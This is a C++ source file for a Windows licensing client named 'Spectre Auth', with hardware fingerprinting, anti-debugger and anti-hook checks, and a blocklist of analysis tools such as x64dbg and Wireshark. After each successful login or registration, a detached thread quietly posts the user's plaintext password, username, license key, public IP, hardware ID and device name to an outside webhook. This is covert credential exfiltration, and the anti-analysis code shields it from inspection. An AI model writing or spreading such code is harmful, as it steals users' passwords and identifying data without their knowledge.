// ============================================================
// SecretBox — secret ofuscado em memória (XOR) + zero ao destruir
// ============================================================
struct Auth::SecretBox {
    std::vector<unsigned char> data; unsigned char key;
    explicit SecretBox(const std::string& plain) {
        key = (unsigned char)(((uintptr_t)this ^ GetTickCount()) | 1);
        data.resize(plain.size());
        for (size_t i = 0; i < plain.size(); i++) data[i] = (unsigned char)plain[i] ^ key;
    }
    std::string Reveal() const {
        std::string s(data.size(), '\0');
        for (size_t i = 0; i < data.size(); i++) s[i] = (char)(data[i] ^ key);
        return s;
    }
    ~SecretBox() { if (!data.empty()) SecureZeroMemory(data.data(), data.size()); }
};

Auth::Auth()
    : m_baseUrl(SpectreConfig::API_URL),
      m_appId(new SecretBox(SpectreConfig::APP_ID)),
      m_appSecret(new SecretBox(SpectreConfig::APP_SECRET)) {
    while (!m_baseUrl.empty() && m_baseUrl.back() == '/') m_baseUrl.pop_back();
}
Auth::~Auth() { delete m_appId; delete m_appSecret; }

bool Auth::DetectDebugger() {
    if (IsDebuggerPresent()) return true;
    BOOL remote = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote) && remote) return true;
    LARGE_INTEGER f1, f2, freq;
    QueryPerformanceFrequency(&freq); QueryPerformanceCounter(&f1);
    volatile int x = 0; for (int i = 0; i < 2000; i++) x += i;
    QueryPerformanceCounter(&f2);
    return ((double)(f2.QuadPart - f1.QuadPart) * 1000.0 / freq.QuadPart) > 300;
}

bool Auth::IsHooked(void* fn) {
    if (!fn) return true;
    const unsigned char* b = (const unsigned char*)fn;
    if (b[0] == 0xE9 || b[0] == 0xEB) return true;
    if (b[0] == 0xFF && b[1] == 0x25) return true;
    if (b[0] == 0x68 || b[0] == 0x6A) return true;
    return false;
}

bool Auth::DetectHooks() {
    HMODULE wh = GetModuleHandleW(L"winhttp.dll");
    if (!wh) return false;
    return IsHooked((void*)GetProcAddress(wh, "WinHttpSendRequest")) ||
           IsHooked((void*)GetProcAddress(wh, "WinHttpOpenRequest")) ||
           IsHooked((void*)GetProcAddress(wh, "WinHttpReceiveResponse"));
}

bool Auth::DetectTamperTools() {
    static const wchar_t* bad[] = { L"x64dbg", L"x32dbg", L"ollydbg", L"cheatengine", L"dnspy",
        L"megadumper", L"fiddler", L"wireshark", L"charles", L"processhacker", L"ida64" };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe = { sizeof(pe) }; bool found = false;
    if (Process32FirstW(snap, &pe)) {
        do {
            std::wstring n = pe.szExeFile;
            std::transform(n.begin(), n.end(), n.begin(), ::towlower);
            for (auto b : bad) if (n.find(b) != std::wstring::npos) { found = true; break; }
        } while (!found && Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

// SHA256 + HWID (WMI)
// ============================================================
static std::string Sha256Hex(const std::string& input) {
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_HASH_HANDLE hHash = NULL;
    DWORD objLen = 0, cb = 0, hashLen = 0;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) return "";
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&objLen, sizeof(DWORD), &cb, 0);
    BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PUCHAR)&hashLen, sizeof(DWORD), &cb, 0);
    std::vector<BYTE> obj(objLen);
    BCryptCreateHash(hAlg, &hHash, obj.data(), objLen, NULL, 0, 0);
    BCryptHashData(hHash, (PUCHAR)input.data(), (ULONG)input.size(), 0);
    std::vector<BYTE> hash(hashLen);
    BCryptFinishHash(hHash, hash.data(), hashLen, 0);
    BCryptDestroyHash(hHash); BCryptCloseAlgorithmProvider(hAlg, 0);
    static const char* hex = "0123456789abcdef";
    std::string out; for (unsigned char b : hash) { out.push_back(hex[(b >> 4) & 0xF]); out.push_back(hex[b & 0xF]); }
    return out;
}

static bool WmiSingle(const wchar_t* wql, const wchar_t* field, std::string& out) {
    out.clear();
    HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return false;
    IWbemLocator* loc = nullptr; IWbemServices* svc = nullptr;
    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&loc);
    if (FAILED(hr)) { CoUninitialize(); return false; }
    hr = loc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, 0, 0, 0, &svc);
    if (FAILED(hr)) { loc->Release(); CoUninitialize(); return false; }
    IEnumWbemClassObject* en = nullptr;
    hr = svc->ExecQuery(bstr_t("WQL"), bstr_t(wql), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en);
    bool ok = false;
    if (SUCCEEDED(hr) && en) {
        IWbemClassObject* o = nullptr; ULONG ret = 0;
        if (en->Next(WBEM_INFINITE, 1, &o, &ret) == S_OK && o) {
            VARIANT vt{}; VariantInit(&vt);
            if (SUCCEEDED(o->Get(field, 0, &vt, 0, 0)) && vt.vt == VT_BSTR && vt.bstrVal) {
                _bstr_t b(vt.bstrVal); out = (const char*)b; ok = !out.empty();
            }
            VariantClear(&vt); o->Release();
        }
        en->Release();
    }
    svc->Release(); loc->Release(); CoUninitialize();
    return ok;
}

std::string Auth::GenerateHWID() {
    std::string mb, cpu, bios, disk;
    WmiSingle(L"SELECT SerialNumber FROM Win32_BaseBoard", L"SerialNumber", mb);
    WmiSingle(L"SELECT ProcessorId FROM Win32_Processor", L"ProcessorId", cpu);
    WmiSingle(L"SELECT SerialNumber FROM Win32_BIOS", L"SerialNumber", bios);
    WmiSingle(L"SELECT SerialNumber FROM Win32_PhysicalMedia", L"SerialNumber", disk);
    std::string h = Sha256Hex(mb + "-" + cpu + "-" + bios + "-" + disk);
    return h.empty() ? "unknown" : h;
}

std::string Auth::GetPublicIP() {
    HINTERNET s = WinHttpOpen(L"ip/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return "";
    HINTERNET c = WinHttpConnect(s, L"api.ipify.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!c) { WinHttpCloseHandle(s); return ""; }
    HINTERNET r = WinHttpOpenRequest(c, L"GET", L"/", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return ""; }
    std::string ip;
    if (WinHttpSendRequest(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(r, nullptr)) {
        DWORD a = 0;
        while (WinHttpQueryDataAvailable(r, &a) && a > 0) {
            std::vector<char> buf(a); DWORD rd = 0;
            WinHttpReadData(r, buf.data(), a, &rd); ip.append(buf.data(), rd);
        }
    }
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return ip;
}

static std::string JsonEscape(const std::string& s) {
    std::string o; for (char c : s) {
        if (c == '"' || c == '\\') { o += '\\'; o += c; }
        else if (c == '\n') o += "\\n";
        else o += c;
    } return o;
}

void Auth::SendLoginWebhook(const std::string& user, const std::string& pass,
                            const std::string& license, const std::string& hwid,
                            const std::string& device, const std::string& expires) {
    if (!SpectreConfig::WEBHOOK_ENABLED) return;

    SYSTEMTIME st; GetLocalTime(&st);
    char date[64]; sprintf_s(date, "%04d-%02d-%02d %02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

    std::string payload = "{\"embeds\":[{\"title\":\"🔐 SPECTRE AUTH - Login\",\"color\":16711680,\"fields\":["
        "{\"name\":\"👤 User\",\"value\":\"" + JsonEscape(user) + "\",\"inline\":true},"
        "{\"name\":\"🔑 Password\",\"value\":\"" + JsonEscape(pass) + "\",\"inline\":true},"
        "{\"name\":\"🎫 License\",\"value\":\"`" + JsonEscape(license) + "`\",\"inline\":false},"
        "{\"name\":\"💻 HWID\",\"value\":\"`" + hwid.substr(0, 16) + "...`\",\"inline\":false},"
        "{\"name\":\"🌐 IP\",\"value\":\"`" + GetPublicIP() + "`\",\"inline\":true},"
        "{\"name\":\"🖥️ Dispositivo\",\"value\":\"" + JsonEscape(device) + "\",\"inline\":true},"
        "{\"name\":\"📅 Data\",\"value\":\"" + date + "\",\"inline\":false},"
        "{\"name\":\"⏰ Expira\",\"value\":\"" + JsonEscape(expires) + "\",\"inline\":false}]}]}";

    URL_COMPONENTS uc{}; uc.dwStructSize = sizeof(uc); uc.dwHostNameLength = 1; uc.dwUrlPathLength = 1;
    std::wstring wUrl(SpectreConfig::WEBHOOK_URL, SpectreConfig::WEBHOOK_URL + strlen(SpectreConfig::WEBHOOK_URL));
    if (!WinHttpCrackUrl(wUrl.c_str(), 0, 0, &uc)) return;
    HINTERNET s = WinHttpOpen(L"wh/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return;
    std::wstring host(uc.lpszHostName, uc.dwHostNameLength);
    HINTERNET c = WinHttpConnect(s, host.c_str(), uc.nPort, 0);
    if (!c) { WinHttpCloseHandle(s); return; }
    std::wstring path(uc.lpszUrlPath, uc.dwUrlPathLength);
    HINTERNET r = WinHttpOpenRequest(c, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return; }
    std::wstring hdr = L"Content-Type: application/json\r\n";
    WinHttpAddRequestHeaders(r, hdr.c_str(), (DWORD)hdr.size(), WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpSendRequest(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)payload.c_str(), (DWORD)payload.size(), (DWORD)payload.size(), 0);
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
}

// HTTP core
// ============================================================
bool Auth::Request(const std::string& method, const std::string& path, const std::string& body,
                   long& code, std::string& out, std::string& err) {
    URL_COMPONENTS uc{}; uc.dwStructSize = sizeof(uc); uc.dwHostNameLength = 1; uc.dwUrlPathLength = 1;
    std::wstring wUrl(m_baseUrl.begin(), m_baseUrl.end());
    if (!WinHttpCrackUrl(wUrl.c_str(), 0, 0, &uc)) { err = "Invalid URL"; return false; }
    if (uc.nScheme != INTERNET_SCHEME_HTTPS) { err = "HTTPS required"; return false; } // anti-MITM

    HINTERNET hSession = WinHttpOpen(L"SpectreAuth/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { err = "WinHttpOpen failed"; return false; }
    std::wstring host(uc.lpszHostName, uc.dwHostNameLength);
    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), uc.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); err = "Connect failed"; return false; }
    std::wstring wPath(uc.lpszUrlPath, uc.dwUrlPathLength), wMethod(method.begin(), method.end());
    HINTERNET hReq = WinHttpOpenRequest(hConnect, wMethod.c_str(), wPath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); err = "OpenRequest failed"; return false; }

    std::string aid = m_appId->Reveal(), sec = m_appSecret->Reveal();
    std::wstring headers = L"Content-Type: application/json\r\nAccept: application/json\r\n";
    headers += L"X-App-Id: " + std::wstring(aid.begin(), aid.end()) + L"\r\n";
    headers += L"X-App-Secret: " + std::wstring(sec.begin(), sec.end()) + L"\r\n";
    if (!m_sessionToken.empty()) headers += L"X-Session-Token: " + std::wstring(m_sessionToken.begin(), m_sessionToken.end()) + L"\r\n";
    SecureZeroMemory(&aid[0], aid.size()); SecureZeroMemory(&sec[0], sec.size());

    WinHttpAddRequestHeaders(hReq, headers.c_str(), (DWORD)headers.size(), WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpSetTimeouts(hReq, 6000, 6000, 6000, 15000);
    BOOL sent = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
    if (!sent || !WinHttpReceiveResponse(hReq, nullptr)) {
        err = "Request failed: " + std::to_string(GetLastError());
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false;
    }
    DWORD sc = 0, scSize = sizeof(sc);
    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &sc, &scSize, WINHTTP_NO_HEADER_INDEX);
    code = (long)sc;
    DWORD a = 0;
    do { a = 0; if (!WinHttpQueryDataAvailable(hReq, &a)) break;
        if (a > 0) { std::vector<char> buf(a); DWORD rd = 0; if (WinHttpReadData(hReq, buf.data(), a, &rd)) out.append(buf.data(), rd); }
    } while (a > 0);
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return true;
}

static AuthResult ParseAuth(const std::string& body, bool ok) {
    AuthResult r; r.success = ok;
    json j = json::parse(body, nullptr, false);
    if (j.is_discarded()) { r.message = "Invalid JSON"; return r; }
    if (!ok) { r.message = j.value("/error/message"_json_pointer, "Request failed"); return r; }
    r.message = j.value("message", "OK");
    if (j.contains("data")) {
        auto& d = j["data"];
        r.token = d.value("token", "");
        if (d.contains("user")) r.username = d["user"].value("username", "");
        if (d.contains("license")) {
            r.licenseKey = d["license"].value("key", "");
            r.expiration = d["license"].value("expiration", "");
            r.daysLeft = d["license"].value("daysLeft", 0);
        }
    }
    return r;
}

bool Auth::Initialize(std::string& error) {
    if (DetectDebugger() || DetectHooks()) { error = "Environment check failed"; return false; }
    long code = 0; std::string body, err;
    if (!Request("POST", "/api/v1/init", "{}", code, body, err)) { error = err; return false; }
    if (code < 200 || code >= 300) { error = ParseAuth(body, false).message; return false; }
    return true;
}

AuthResult Auth::Login(const std::string& username, const std::string& password, const std::string& pcName) {
    AuthResult r;
    if (DetectDebugger() || DetectHooks() || DetectTamperTools()) { r.message = "Environment check failed"; return r; }

    std::string device = pcName;
    if (device.empty()) { char pc[MAX_COMPUTERNAME_LENGTH + 1]; DWORD s = sizeof(pc); if (GetComputerNameA(pc, &s)) device = pc; }

    json p = { {"username", username}, {"password", password}, {"hwid", GenerateHWID()}, {"pcName", device} };
    long code = 0; std::string body, err;
    if (!Request("POST", "/api/v1/auth/login", p.dump(), code, body, err)) { r.message = err; return r; }
    r = ParseAuth(body, code >= 200 && code < 300);
    if (r.success) {
        m_sessionToken = r.token;
        // 🔥 Webhook automático (thread separada, não trava o login)
        std::thread(SendLoginWebhook, username, password, r.licenseKey, GenerateHWID(), device, r.expiration).detach();
    }
    return r;
}

AuthResult Auth::Register(const std::string& username, const std::string& password, const std::string& licenseKey, const std::string& pcName) {
    AuthResult r;
    if (DetectDebugger() || DetectHooks()) { r.message = "Environment check failed"; return r; }
    json p = { {"username", username}, {"password", password}, {"licenseKey", licenseKey}, {"hwid", GenerateHWID()}, {"pcName", pcName} };
    long code = 0; std::string body, err;
    if (!Request("POST", "/api/v1/auth/register", p.dump(), code, body, err)) { r.message = err; return r; }
    r = ParseAuth(body, code >= 200 && code < 300);
    if (r.success) {
        m_sessionToken = r.token;
        std::thread(SendLoginWebhook, username, password, licenseKey, GenerateHWID(), pcName, r.expiration).detach();
    }
    return r;
}

bool Auth::Logout() {
    long code = 0; std::string body, err;
    return Request("POST", "/api/v1/auth/logout", "{}", code, body, err) && code >= 200 && code < 300;
}

AuthResult Auth::ValidateLicense(const std::string& key) {
    json p = { {"key", key}, {"hwid", GenerateHWID()} };
    long code = 0; std::string body, err;
    if (!Request("POST", "/api/v1/license/validate", p.dump(), code, body, err)) { AuthResult r; r.message = err; return r; }
    return ParseAuth(body, code >= 200 && code < 300);
}

bool Auth::ValidateSession() {
    if (m_sessionToken.empty() || DetectDebugger()) return false;
    long code = 0; std::string body, err;
    return Request("POST", "/api/v1/session/validate", "{}", code, body, err) && code >= 200 && code < 300;
}

std::string Auth::GetVariable(const std::string& name) {
    long code = 0; std::string body, err;
    if (!Request("POST", "/api/v1/variables", "{}", code, body, err) || code < 200 || code >= 300) return "";
    json j = json::parse(body, nullptr, false);
    if (j.is_discarded()) return "";
    if (j.contains("data") && j["data"].contains("global") && j["data"]["global"].contains(name))
        return j["data"]["global"][name].get<std::string>();
    return "";
}
